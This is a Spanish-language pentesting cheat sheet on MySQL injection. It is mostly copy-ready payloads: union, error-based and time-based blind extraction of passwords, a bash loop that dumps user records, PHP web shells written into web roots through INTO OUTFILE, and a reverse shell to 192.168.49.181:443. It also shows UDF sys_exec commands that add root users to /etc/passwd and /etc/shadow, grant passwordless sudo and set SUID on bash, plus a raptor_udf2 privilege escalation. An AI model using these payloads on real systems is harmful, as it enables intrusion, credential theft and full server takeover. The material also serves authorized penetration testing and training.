# Inyeccion MySQL 

# Indice
- [Bases de datos por defecto](#Bases-de-datos-por-defecto)
- [Metodologia](#Metodologia)
- [Union based](#Union-based)
    - [Deteccion del numero de columnas](#Deteccion-del-numero-de-columnas)
    - [Enumeracion de la base de datos con information_schema](#Enumeracion-de-la-base-de-datos-con-information-schema)
- [Error based](#Error-based)
- [Blind](#Blind)
- [SQLI to RCE](#SQLI-to-RCE)
    - [MYSQL Leer el contenido de un archivo](#MYSQL-Leer-el-contenido-de-un-archivo)
    - [MYSQL PHP Shell](#MYSQL-PHP-Shell)
      - [Outfile](#Outfile)
      - [Dumpfile](#Dumpfile)
      - [Passthru](#Passthru)
    - [MYSQL UDF](#MYSQL-UDF)
       - [UDF Simple](#UDF-Simple)
       - [Exploits publicos](#Exploits-publicos)
- [Filter Bypass](#Filter-Bypass)
- [Referencias](#Referencias)



# Bases de datos por defecto

|Name|Description|
|---|---|
|mysql|Requiere permisos root|
|information_schema|Disponible desde la version 5 y superiores|

# Metodologia
Normalmente al encontrar una vulnerabilidad de inyeccion SQL siempre vamos a seguir el mismo orden
1. Enumeracion de columnas
2. Enumeracion de columnas que imprimen contenido
3. Enumeracion de version, nombre de usuario, nombre de la base de datos, etc
4. Enumeracion de bases de datos
5. Enumeracion de tablas
6. Enumeracion de columnas
7. Dumpeo de datos
   

# Union based
## Deteccion del numero de columnas

Podemos usar `order by` o `group by`

````
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
````

````
1' GROUP BY 1--
1' GROUP BY 2--
1' GROUP BY 3--
````

> El numero correcto lo sabremos al obtener una respuesta que confirme que la query es falsa, es decir que el numero de columnas no existe:
- Error de SQL
- Cambio en el contenido de la respuesta (pueden aparecer o desaparecer cosas)
- Cambio en el Content-Length

ERROR BASED
> Estos metodos funcionan si el mostrar errores esta habilitado

`UNION SELECT`

````
1' UNION SELECT @--+        #The used SELECT statements have a different number of columns
1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns
1' UNION SELECT @,@,@--+    #Repetir este proceso hasta que no obtengamos errores 1 @ = 1 columna
````

`LIMIT INTO`

````
1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@,@--+    #Repetir este proceso hasta que no obtengamos errores 1 @ = 1 columna
````

`SELECT * FROM TABLA`
> Para este metodo necesitamos saber el nombre de la tabla

````
1' AND (SELECT * FROM Users) = 1--+ 	#Operand should contain 3 column(s)
````



## Enumeracion de la base de datos con information_schema

````
UniOn Select 1,2,schema_name+fRoM+information_schema.schemata
UniOn Select 1,2,table_name+fRoM+information_schema.tables+wHeRe+table_schema=<nombre_bd>
UniOn Select 1,2,column_name+fRoM+information_schema.columns+wHeRe+table_name=<tabla>
UniOn Select 1,data,user,password+fRoM+<tabla>
````

En caso que solo tengamos una columna para imprimir contenido podemos usar 'group_concat' para pedir en la misma consulta varios campos
````
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C,user,0x7C,password)+fRoM+<tabla>
````

> En el caso de tener una inyeccion valida en uno de los valores de una columna y queramos ver todos los valores de esa columna podemos usar LIMIT para extraerlos linea a linea en caso que no sea posible visualizar todo el contenido.

Ejemplo:

````
SELECT * from users where email = '{input email}';
````
Usariamos la condicion verdadera 'or 1=1 para ignorar la consulta del campo email y que nos devuelva todos los emails de los usuarios
````
SELECT * from users where email = 'test@test.com' or 1=1;-- -';
  <h2> User not found with that email!
````
Al no ser posible obtener todos los valores de la columna usaremos el `LIMIT` para obtener el de cada linea.
````
' or 1=1 LIMIT 0,1;-- -';
' or 1=1 LIMIT 1,1;-- -';
' or 1=1 LIMIT 2,1;-- -';
' or 1=1 LIMIT 3,1;-- -';
' or 1=1 LIMIT 4,1;-- -';
' or 1=1 LIMIT 5,1;-- -';
````

Esto lo podemos realizar de manera automatica con un bucle for
````bash
for i in $(seq 1 500);
do curl -s -X POST http://x.x.x.x/test.php --data-urlencode "email=test@test.com' or 1=1 limit $i,1-- -" |grep "\<h2>" | sed 's/^ *//';
done
````

`NOT LIKE`

Este operador nos puede servir para filtrar resultados de consultas o enumerar mediante descarte lineas de tablas o columnas en caso que no podamos verlas en su totalidad

````
' UNION select 1,group_concat(username,password),3,4 from users where username NOT LIKE \"john\" -- -

' UNION select 1,table_name,3,4 from information_schema.tables where table_name NOT LIKE \"tablaX\"-- -
 Resultado: Tabla1
' UNION select 1,table_name,3,4 from information_schema.tables where table_name NOT LIKE \"tabla1\"-- -
 Resultado: Tabla2
' UNION select 1,table_name,3,4 from information_schema.tables where table_name NOT LIKE \"tabla2\"-- -
 Resultado: Tabla3
````

# Error based

````
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
````

# Blind
Para explotar este tipo de inyeccion SQL usaremos la funcion `sleep` como confirmacion al pedir los datos de manera que si la request tarda en realizarse x segundos confirmaremos la vulnerabilidad.


Seguiremos empleando condicionales

````
select+case+when+(<CONDITION>)+THEN+<ACTION DE CONFIRMACION V>+ELSE+<ACTION DE CONFIRMACION F>+END from <table>--
````

Una vez encontrado el campo inyectable confirmaremos el time based con la siguiente consulta simple

````
‘|| sleep(10)--
````

A continuación para conseguir información de la base de datos emplearemos condicionales usando la query de ejemplo, primero confirmaremos que la condición funciona con 1=1 
````
select+case+when+(1=1)+THEN+sleep(10)+ELSE+sleep(0)>+END--
````

Viendo que la request tarda 10 segundos confirmamos que funciona ahora vamos a enumerar la base de datos sabiendo que en la tabla users hay un usuario llamado administrator
````
# Confirmacion que el valor del campo username existe
select+case+when+(userame=’administrator’)+THEN+sleep(10)+ELSE+sleep(0)>+END from users--

# Hayamos la longitud de la contraseña
select+case+when+(userame=’administrator’ AND LENGTH(password)><1,2,3,...>)+THEN+sleep(10)+ELSE+sleep(0)>+END from users--

# Hayar todos los caracteres de la contraseña (longitud = 20)
select+case+when+(userame=’administrator’ AND SUBSTRING(password,1,1)='a')+THEN+sleep(10)+ELSE+sleep(0)>+END from users–
````

> No olvidar indicar el usuario del que queremos la contraseña ya que si no cojera la de cualquier campo.

A partir de aqui la manera mas eficiente de dumpear todos los caracteres es mediante fuerza bruta, lo haremos con la ClusterBomb de BurpSuite 
````
select+case+when+(userame=’administrator’ AND SUBSTRING(password,§1§,1)='§a§')+THEN+sleep(10)+ELSE+sleep(0)>+END from users–
````

> Importante indicar que envie una sola request por intento

![image](https://github.com/n3masyst/Pentesting/assets/133997401/bbb2d244-2233-412f-b7f0-10c894fcfe85)

# SQLI to RCE
## MYSQL Leer el contenido de un archivo

```sql
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
' UNION SELECT 1,2,LOAD_FILE('/etc/passwd') --
```

```sql
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
```

Si somos `root` en la base de datos, podemos activar la propiedad `LOAD_FILE` usando la query:

```sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
```

## MYSQL PHP Shell

###  Outfile 

```sql
UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
("<?php echo shell_exec($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'    # Windows
SELECT "<?php exec (\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.49.181/443 0>&1'\");?>" into outfile "/var/www/https/blogblog/wp-content/uploads/test.php";   # Linux
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

### Dumpfile

```sql
UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
```

### Passthru
````sql
("<?php echo passthru($_GET['cmd']);") INTO OUTFILE ‘<path>’
````

## MYSQL UDF

Checklist:

1. Verificar que mysql tenga el plugin de UDF instalado
````bash
ls -la /usr/lib/lib_mysqludf_sys.so 
````
2. El usuario root tiene la contraaseña en blanco
3. Mysql esta corriendo con permisos root

### UDF Simple

Usando `sys_exec`

````
# Dar permisos SUID  a la bash
select sys_exec('chmod u+s /bin/bash');

# Sobreescribir /etc/shadow
select sys_exec('echo "test:$6$gmSQKZRp$.T7LrOiLvT66Vqo5NwXB/ne/UgxmQzd46MpMUK67CkMrXDi0xvVg8Hd/h3PXpvFP3DvMsLLrhl7.C42/v93c0.:17921::::::" >> /etc/shadow');

# Sobreescribir /etc/shadow
select sys_exec('echo "aarti:$1$cJ05ZYPP$06zg1KtuJ/CbzTWPmeyNH1:0:0:root:/root:/bin/bash" >> /etc/passwd');

# Sobreescribir /etc/sudoers
select sys_exec('echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers');

# Sobreescribir authorized_keys coon nuestra clave publica
select sys_exec('cat id_rsa.pub >> authorized_keys');
````


Usando `sys_eval`

Crearemos una función llamada `syseval` utilizando la extensión `lib_mysqludf_sys.so`. Esta función permite ejecutar comandos del sistema operativo desde una consulta de MySQL.
La extensión `lib_mysqludf_sys.so` es una biblioteca de usuario definida (User Defined Function, UDF) para MySQL que proporciona una interfaz para llamar a funciones del sistema operativo desde consultas de MySQL. En este caso, la función `syseval` está configurada para devolver un valor entero (INT).

Primero necesitamos una base de datos valida 
````
CREATE FUNCTION sys_eval RETURNS INT SONAME 'lib_mysqludf_sys.so';
````
Una vez creada la funcion ya podemos ejecutar comandos a traves de ella

````
select sys_eval("chmod u+s /bin/bash");
select sys_eval("echo "test:$6$gmSQKZRp$.T7LrOiLvT66Vqo5NwXB/ne/UgxmQzd46MpMUK67CkMrXDi0xvVg8Hd/h3PXpvFP3DvMsLLrhl7.C42/v93c0.:17921::::::" >> /etc/shadow");
select sys_eval("echo "aarti:$1$cJ05ZYPP$06zg1KtuJ/CbzTWPmeyNH1:0:0:root:/root:/bin/bash" >> /etc/passwd");
select sys_eval("echo "aarti:$1$cJ05ZYPP$06zg1KtuJ/CbzTWPmeyNH1:0:0:root:/root:/bin/bash" >> /etc/passwd");
select sys_eval("echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers");
select sys_eval("cat id_rsa.pub >> authorized_keys");
````

### Exploits publicos

Primero debemos identificar que version de MySQL esta ejecutandose y una vez identificada elegir el exploit correcto 
![image](https://github.com/n3masyst/Pentesting/assets/133997401/212417d0-09fd-4112-8116-5697e5df29ef)

1. Descargaremos el exploit a la maquina victima y lo compilaremos dentro
````
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
````

2. Consultamos si esta configurada la carpeta de plugins
````sql
show variables like '%plugin%';
````
3. Seguir los pasos del exploit
````
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
````

4. Una vez creada la funcion `do_system` en vez de ver el contenido de la tabla la usaremos para ejecutar comandos
````
select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
select do_system('echo "pass123" | passwd --stdin root');
````

* [Explotacion automatica](https://packetstormsecurity.com/files/151369/MySQL-User-Defined-Linux-x32-x86_64-sys_exec-Privilege-Escalation.html)

# Filter Bypass

Para identificar la existencia de un filtro basado en palabras o comandos de SQL primero debemos tener una confirmacion de que la consulta se esta ejecutando correctamente (error, output, tiempo de respuesta).

Procederemos a poner los comandos de SQL que sospechamos pueden estar siendo bloqueadas despues del comentario -- -

````
' order by 5-- -test
  MySQL error ...

' order by 5-- -union
  (Sin respuesta)

' order by 5-- -select
' order by 5-- -limit
' order by 5-- -group_concat
````

Una vez identificado el componente que filtra podemos ofuscarlo mediante varias tecnicas


- Intercalando mayusculas y minusculas
````
' UnIOn select 1,2,3,4 -- -
````
- Hexadecimal
Permite bypassear las "" a la hora de especificar una tabla o columna
````
echo -n "tabla" | xxd -ps
UniOn Select 1,2,3,table_name+fRoM+information_schema.tables+wHeRe+table_schema=0x7573657273-- -
````

# Referencias
- [Portswigger SQL Injection Cheetsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
